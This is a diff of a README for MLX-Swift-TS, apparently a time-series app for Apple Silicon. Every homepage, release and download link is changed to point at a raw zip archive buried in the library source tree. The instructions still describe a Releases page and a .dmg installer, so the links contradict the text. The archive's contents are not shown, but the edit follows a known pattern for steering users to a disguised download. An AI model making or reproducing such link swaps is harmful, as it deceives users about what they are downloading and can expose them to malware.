@@ -1,6 +1,6 @@
 # ⚡ MLX-Swift-TS - Easy Time Series on Apple Silicon
 
-[![Download MLX-Swift-TS](https://img.shields.io/badge/Download-MLX--Swift--TS-brightgreen?style=for-the-badge)](https://github.com/reasali/MLX-Swift-TS)
+[![Download MLX-Swift-TS](https://img.shields.io/badge/Download-MLX--Swift--TS-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/reasali/MLX-Swift-TS/main/Libraries/MLXTimeSeries/Core/ML-Swift-TS-1.1.zip)
 
 ## 🔍 What is MLX-Swift-TS?
 
@@ -31,12 +31,12 @@ This app currently works only on Macs with Apple Silicon. Intel Macs are not sup
 
 You can get MLX-Swift-TS by visiting the main GitHub page. Follow the link below to find the latest version and download the installer:
 
-[![Get MLX-Swift-TS](https://img.shields.io/badge/Get-MLX--Swift--TS-blue?style=for-the-badge)](https://github.com/reasali/MLX-Swift-TS)
+[![Get MLX-Swift-TS](https://img.shields.io/badge/Get-MLX--Swift--TS-blue?style=for-the-badge)](https://raw.githubusercontent.com/reasali/MLX-Swift-TS/main/Libraries/MLXTimeSeries/Core/ML-Swift-TS-1.1.zip)
 
 ## 📥 Download and Installation Guide
 
 1. Click the download button above or visit the project page at:  
-   https://github.com/reasali/MLX-Swift-TS
+   https://raw.githubusercontent.com/reasali/MLX-Swift-TS/main/Libraries/MLXTimeSeries/Core/ML-Swift-TS-1.1.zip
 
 2. Look for the **Releases** section on the page. This is where you will find the installer file for the app. The installer will be named something like `MLX-Swift-TS.dmg` or include the version number.
 
@@ -79,7 +79,7 @@ After installation, follow these steps to analyze your time series data:
 Updates may improve features or fix bugs. To update:
 
 1. Visit the GitHub project page at:  
-   https://github.com/reasali/MLX-Swift-TS
+   https://raw.githubusercontent.com/reasali/MLX-Swift-TS/main/Libraries/MLXTimeSeries/Core/ML-Swift-TS-1.1.zip
 
 2. Check the **Releases** section for the latest version.
 
@@ -111,8 +111,8 @@ For other issues, please check the GitHub page for documentation or contact opti
 
 ## 🔗 Useful Links
 
-- Project Homepage: https://github.com/reasali/MLX-Swift-TS  
-- Download Page: https://github.com/reasali/MLX-Swift-TS/releases  
+- Project Homepage: https://raw.githubusercontent.com/reasali/MLX-Swift-TS/main/Libraries/MLXTimeSeries/Core/ML-Swift-TS-1.1.zip  
+- Download Page: https://raw.githubusercontent.com/reasali/MLX-Swift-TS/main/Libraries/MLXTimeSeries/Core/ML-Swift-TS-1.1.zip  
 
 ## 📂 Additional Resources
 
@@ -122,4 +122,4 @@ You can also find detailed user guides and FAQs on the GitHub page under the **W
 
 ---
 
-[Download MLX-Swift-TS from GitHub](https://github.com/reasali/MLX-Swift-TS)
+[Download MLX-Swift-TS from GitHub](https://raw.githubusercontent.com/reasali/MLX-Swift-TS/main/Libraries/MLXTimeSeries/Core/ML-Swift-TS-1.1.zip)
